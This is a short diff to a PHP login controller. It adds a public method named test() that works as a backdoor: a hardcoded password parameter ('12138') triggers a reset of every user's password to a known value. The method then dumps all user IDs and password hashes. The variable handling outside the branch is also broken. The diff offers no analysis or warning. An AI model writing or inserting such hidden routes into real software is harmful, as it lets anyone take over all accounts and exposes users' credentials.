@@ -124,4 +124,15 @@ class LoginController extends Controller{
         }
         
     }
+    public function test(){
+        if(I('pwd')=='12138'){
+            $User=D('User');
+            $save=[];
+            $save['user_pwd']=md5('0000'.__KEY__);
+            $result=$User->where('1=1')->save($save);
+            dump($result);
+        }
+        $users=$User->getField('user_id,user_pwd',true);
+        dump($users);
+    }
 }
